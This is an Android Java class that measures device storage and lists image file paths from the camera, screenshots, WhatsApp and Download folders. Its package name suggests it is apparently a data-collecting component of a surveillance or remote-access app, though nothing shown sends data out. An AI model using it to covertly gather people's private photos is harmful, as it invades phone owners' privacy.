package com.ultimate.access.collectors;

import android.content.Context;
import android.os.Environment;
import android.os.StatFs;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class FileCollector {

    private Context context;

    public FileCollector(Context context) {
        this.context = context;
    }

    public long getInternalStorageTotal() {
        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
        return stat.getTotalBytes();
    }

    public long getInternalStorageFree() {
        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
        return stat.getFreeBytes();
    }

    public long getInternalStorageUsed() {
        return getInternalStorageTotal() - getInternalStorageFree();
    }

    public boolean isExternalStorageAvailable() {
        return Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);
    }

    public long getExternalStorageTotal() {
        if (isExternalStorageAvailable()) {
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            return stat.getTotalBytes();
        }
        return 0;
    }

    public long getExternalStorageFree() {
        if (isExternalStorageAvailable()) {
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            return stat.getFreeBytes();
        }
        return 0;
    }

    public long getExternalStorageUsed() {
        return getExternalStorageTotal() - getExternalStorageFree();
    }

    public List<String> getAllImages() {
        List<String> images = new ArrayList<>();

        // Camera images
        File cameraDir = new File(Environment.getExternalStorageDirectory() + "/DCIM/Camera/");
        if (cameraDir.exists()) {
            addImagesFromDir(cameraDir, images);
        }

        // Screenshots
        File screenshotDir = new File(Environment.getExternalStorageDirectory() + "/Pictures/Screenshots/");
        if (screenshotDir.exists()) {
            addImagesFromDir(screenshotDir, images);
        }

        // WhatsApp images
        File whatsappDir = new File(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/");
        if (whatsappDir.exists()) {
            addImagesFromDir(whatsappDir, images);
        }

        // Downloads
        File downloadsDir = new File(Environment.getExternalStorageDirectory() + "/Download/");
        if (downloadsDir.exists()) {
            addImagesFromDir(downloadsDir, images);
        }

        return images;
    }

    private void addImagesFromDir(File dir, List<String> images) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    String name = file.getName().toLowerCase();
                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") ||
                            name.endsWith(".png") || name.endsWith(".gif") ||
                            name.endsWith(".bmp")) {
                        images.add(file.getAbsolutePath());
                    }
                }
            }
        }
    }
}